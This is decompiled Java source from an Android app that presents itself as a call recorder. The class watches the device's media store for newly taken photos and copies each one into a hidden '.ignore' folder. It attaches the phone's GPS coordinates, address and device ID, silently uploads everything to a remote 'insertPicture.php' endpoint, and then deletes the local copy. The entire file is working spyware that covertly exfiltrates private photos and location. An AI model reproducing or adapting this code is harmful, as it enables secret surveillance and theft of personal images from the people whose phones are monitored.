package com.yasoka.spcallrecord.recorder.call.a.c.g;

import a.b.a.a.a;
import a.c.b.E;
import a.c.b.a0;
import a.c.e.e;
import a.c.j.c;
import android.content.Context;
import android.content.ContextWrapper;
import android.content.Intent;
import android.database.Cursor;
import android.location.Location;
import android.provider.MediaStore.Images.Media;
import android.webkit.MimeTypeMap;
import androidx.browser.trusted.sharing.ShareTarget;
import com.app.received.LocationReceived;
import com.app.service.UploadDataService;
import com.crashlytics.android.Crashlytics;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.HashMap;
import okhttp3.MediaType;
import okhttp3.MultipartBody.Part;
import okhttp3.RequestBody;

/* compiled from: Media */
public class h implements Runnable {

    /* renamed from: e reason: collision with root package name */
    private static String f230e = "";

    /* renamed from: a reason: collision with root package name */
    private final Context f231a;

    /* renamed from: b reason: collision with root package name */
    private final String f232b;

    /* renamed from: c reason: collision with root package name */
    private String f233c = "";

    /* renamed from: d reason: collision with root package name */
    private Cursor f234d;

    public h(Context context, String str) {
        this.f231a = context;
        this.f232b = str;
    }

    private void a() {
        if (this.f232b.equals("INTERNAL")) {
            this.f234d = this.f231a.getContentResolver().query(Media.INTERNAL_CONTENT_URI, null, null, null, "date_added ASC");
        } else {
            this.f234d = this.f231a.getContentResolver().query(Media.EXTERNAL_CONTENT_URI, null, null, null, "date_added ASC");
        }
    }

    private void b() throws Throwable {
        long j;
        double d2;
        double d3;
        long j2;
        boolean z;
        Cursor cursor = this.f234d;
        Long valueOf = Long.valueOf(cursor.getLong(cursor.getColumnIndexOrThrow("date_added")));
        Calendar instance = Calendar.getInstance();
        instance.setTimeInMillis(valueOf.longValue());
        long timeInMillis = instance.getTimeInMillis() * 1000;
        if (Calendar.getInstance().getTimeInMillis() - timeInMillis < 100000) {
            Cursor cursor2 = this.f234d;
            String str = "_display_name";
            String string = cursor2.getString(cursor2.getColumnIndexOrThrow(str));
            if (string == null) {
                Thread.sleep(250);
                a();
                Cursor cursor3 = this.f234d;
                string = cursor3.getString(cursor3.getColumnIndexOrThrow(str));
            }
            Cursor cursor4 = this.f234d;
            String string2 = cursor4.getString(cursor4.getColumnIndexOrThrow("_size"));
            Cursor cursor5 = this.f234d;
            String string3 = cursor5.getString(cursor5.getColumnIndexOrThrow("_data"));
            StringBuilder sb = new StringBuilder();
            StringBuilder sb2 = new StringBuilder();
            sb2.append(string);
            sb2.append(valueOf);
            sb.append(c.c(sb2.toString()));
            sb.append(" ");
            this.f233c = sb.toString();
            if (!f230e.contains(this.f233c)) {
                StringBuilder sb3 = new StringBuilder();
                sb3.append(f230e);
                sb3.append(this.f233c);
                f230e = sb3.toString();
                String str2 = "";
                if (f230e.length() > 10000) {
                    f230e = str2;
                }
                SimpleDateFormat d4 = c.d();
                instance.setTimeInMillis(timeInMillis);
                String format = d4.format(instance.getTime());
                File file = new File(new ContextWrapper(this.f231a).getFilesDir().getPath(), ".ignore");
                if (!file.exists()) {
                    file.mkdirs();
                }
                String str3 = "/Picture_";
                StringBuilder a2 = a.a(str3);
                a2.append(e.e(this.f231a));
                a2.append(System.currentTimeMillis());
                String str4 = ".jpg";
                a2.append(str4);
                String sb4 = a2.toString();
                if (string != null) {
                    String fileExtensionFromUrl = MimeTypeMap.getFileExtensionFromUrl(string);
                    if (fileExtensionFromUrl != null && !fileExtensionFromUrl.equals(str2)) {
                        StringBuilder a3 = a.a(str3);
                        a3.append(e.e(this.f231a));
                        a3.append(System.currentTimeMillis());
                        a3.append(".");
                        a3.append(fileExtensionFromUrl);
                        sb4 = a3.toString();
                    }
                } else {
                    StringBuilder a4 = a.a("Picture_");
                    a4.append(System.currentTimeMillis());
                    a4.append(str4);
                    string = a4.toString();
                }
                StringBuilder sb5 = new StringBuilder();
                sb5.append(file.getAbsolutePath());
                sb5.append(sb4);
                File file2 = new File(sb5.toString());
                File file3 = new File(string3);
                for (int i = 0; i < 6; i++) {
                    if (!file3.exists()) {
                        Thread.sleep(500);
                    }
                }
                c.a(file3, file2);
                Location a5 = LocationReceived.a();
                double d5 = 0.0d;
                if (a5 != null) {
                    double longitude = a5.getLongitude();
                    double latitude = a5.getLatitude();
                    double accuracy = (double) a5.getAccuracy();
                    j = a5.getTime();
                    double d6 = longitude;
                    d5 = accuracy;
                    d2 = latitude;
                    d3 = d6;
                } else {
                    j = 0;
                    d3 = 0.0d;
                    d2 = 0.0d;
                }
                String a6 = LocationReceived.a(this.f231a);
                if (j != 0) {
                    a6 = a.a(a6, "###DATELOC###", d4.format(Long.valueOf(j)));
                }
                String absolutePath = file2.getAbsolutePath();
                StringBuilder sb6 = new StringBuilder();
                sb6.append(str2);
                sb6.append(d3);
                String sb7 = sb6.toString();
                File file4 = file2;
                StringBuilder sb8 = new StringBuilder();
                sb8.append(str2);
                sb8.append(d2);
                String sb9 = sb8.toString();
                double d7 = d2;
                StringBuilder sb10 = new StringBuilder();
                sb10.append(str2);
                sb10.append(d5);
                String sb11 = sb10.toString();
                double d8 = d5;
                try {
                    a0 a0Var = new a0(this.f231a);
                    StringBuilder sb12 = new StringBuilder();
                    sb12.append(str2);
                    sb12.append(string);
                    String sb13 = sb12.toString();
                    StringBuilder sb14 = new StringBuilder();
                    sb14.append(str2);
                    sb14.append(absolutePath);
                    String sb15 = sb14.toString();
                    StringBuilder sb16 = new StringBuilder();
                    sb16.append(str2);
                    sb16.append(string2);
                    String sb17 = sb16.toString();
                    StringBuilder sb18 = new StringBuilder();
                    sb18.append(str2);
                    sb18.append(format);
                    String sb19 = sb18.toString();
                    StringBuilder sb20 = new StringBuilder();
                    sb20.append(str2);
                    sb20.append(a6);
                    String sb21 = sb20.toString();
                    StringBuilder sb22 = new StringBuilder();
                    sb22.append(str2);
                    sb22.append(sb7);
                    String sb23 = sb22.toString();
                    StringBuilder sb24 = new StringBuilder();
                    sb24.append(str2);
                    sb24.append(sb9);
                    String sb25 = sb24.toString();
                    StringBuilder sb26 = new StringBuilder();
                    sb26.append(str2);
                    sb26.append(sb11);
                    E e2 = new E(sb13, sb15, sb17, sb19, sb21, sb23, sb25, sb26.toString());
                    a0Var.b();
                    j2 = a0Var.a(e2);
                    a0Var.a();
                } catch (Exception e3) {
                    try {
                        e3.getStackTrace();
                        Crashlytics.logException(e3);
                    } catch (Exception unused) {
                    }
                    j2 = -1;
                }
                HashMap hashMap = new HashMap();
                StringBuilder a7 = a.a(str2);
                a7.append(e.e(this.f231a));
                hashMap.put("idPhone", com.app.retrofit.a.a(a7.toString()));
                hashMap.put("name", com.app.retrofit.a.a(string));
                StringBuilder sb27 = new StringBuilder();
                sb27.append(e.e(this.f231a));
                sb27.append("/");
                sb27.append(sb4);
                hashMap.put("pathFile", com.app.retrofit.a.a(sb27.toString()));
                hashMap.put("size", com.app.retrofit.a.a(string2));
                hashMap.put("date", com.app.retrofit.a.a(format));
                hashMap.put("address", com.app.retrofit.a.a(a6));
                StringBuilder sb28 = new StringBuilder();
                sb28.append(str2);
                sb28.append(d3);
                hashMap.put("longitude", com.app.retrofit.a.a(sb28.toString()));
                StringBuilder sb29 = new StringBuilder();
                sb29.append(str2);
                sb29.append(d7);
                hashMap.put("latitude", com.app.retrofit.a.a(sb29.toString()));
                StringBuilder sb30 = new StringBuilder();
                sb30.append(str2);
                sb30.append(d8);
                hashMap.put("accuracy", com.app.retrofit.a.a(sb30.toString()));
                File file5 = file4;
                String str5 = "uploadedfile";
                if (a.c.e.a.a("pictures/insertPicture.php", hashMap, Part.createFormData(str5, file5.getName(), RequestBody.create(MediaType.parse(ShareTarget.ENCODING_TYPE_MULTIPART), file5)))) {
                    int i2 = (int) j2;
                    try {
                        a0 a0Var2 = new a0(this.f231a);
                        a0Var2.b();
                        z = a0Var2.a(i2);
                        a0Var2.a();
                    } catch (Exception e4) {
                        try {
                            e4.getStackTrace();
                            Crashlytics.logException(e4);
                        } catch (Exception unused2) {
                        }
                        z = false;
                    }
                    if (z) {
                        file5.delete();
                    }
                }
            }
        }
    }

    public void run() {
        try {
            Thread.sleep(200);
        } catch (InterruptedException e2) {
            e2.printStackTrace();
        } catch (Throwable th) {
            th.getStackTrace();
        }
        a();
        if (this.f234d != null) {
            if (!this.f234d.moveToLast()) {
                Thread.sleep(300);
                a();
                if (!this.f234d.moveToLast()) {
                    Thread.sleep(300);
                    a();
                    if (!this.f234d.moveToLast()) {
                        Thread.sleep(500);
                        a();
                    }
                }
            } else {
                b();
            }
            this.f234d.close();
        }
        try {
            UploadDataService.b();
            StringBuilder sb = new StringBuilder();
            sb.append("UploadDataService.getmNbTask() : ");
            sb.append(UploadDataService.f1272b);
            sb.toString();
            if (UploadDataService.f1272b <= 0) {
                this.f231a.stopService(new Intent(this.f231a, UploadDataService.class));
            }
        } catch (Throwable th2) {
            try {
                th2.getStackTrace();
                Crashlytics.logException(th2);
            } catch (Exception unused) {
            }
        }
    }
}
